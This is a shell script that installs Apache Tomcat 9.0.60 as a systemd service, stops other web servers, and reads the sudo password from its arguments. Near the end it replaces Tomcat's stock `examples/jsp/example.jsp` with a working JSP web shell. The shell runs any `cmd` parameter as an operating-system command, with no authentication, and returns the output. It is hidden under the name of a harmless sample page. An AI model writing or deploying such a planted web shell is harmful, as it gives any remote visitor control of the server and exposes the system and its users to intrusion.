#!/usr/bin/env sh
echo $* | sudo -S useradd -m -U -d /opt/tomcat -s /bin/false tomcat
echo $* | sudo -S apt-get install -y default-jdk
wget -nc https://web.archive.org/web/20220331224803/https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.60/bin/apache-tomcat-9.0.60.zip
echo $* | sudo -S mkdir -p /opt/tomcat
echo $* | sudo -S unzip apache-tomcat-9.0.60.zip -d /opt/tomcat
echo $* | sudo -S ln -s /opt/tomcat/apache-tomcat-9.0.60 /opt/tomcat/latest
echo $* | sudo -S chown -R tomcat:tomcat /opt/tomcat
echo $* | sudo -S sh -c 'chmod +x /opt/tomcat/latest/bin/*.sh'
echo '[Unit]
Description=Tomcat 9.0 servlet container
After=network.target
[Service]
Type=forking
User=tomcat
Group=tomcat
Environment="JAVA_HOME=/usr/lib/jvm/default-java"
Environment="JAVA_OPTS=-Djava.security.egd=file:///dev/urandom"
Environment="CATALINA_BASE=/opt/tomcat/latest"
Environment="CATALINA_HOME=/opt/tomcat/latest"
Environment="CATALINA_PID=/opt/tomcat/latest/temp/tomcat.pid"
Environment="CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC"
ExecStart=/opt/tomcat/latest/bin/startup.sh
ExecStop=/opt/tomcat/latest/bin/shutdown.sh
[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/tomcat.service
echo $* | sudo -S systemctl stop apache2
echo $* | sudo -S systemctl stop lighttpd
echo $* | sudo -S systemctl stop nginx
echo $* | sudo -S systemctl stop openresty
echo '<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
}
%>
</pre>
</BODY></HTML>' | sudo tee /opt/tomcat/latest/webapps/examples/jsp/example.jsp
echo $* | sudo -S systemctl daemon-reload
echo $* | sudo -S systemctl stop nginx
echo $* | sudo -S systemctl stop apache2
echo $* | sudo -S systemctl stop nginx
echo $* | sudo -S systemctl stop openresty
echo $* | sudo -S systemctl start tomcat
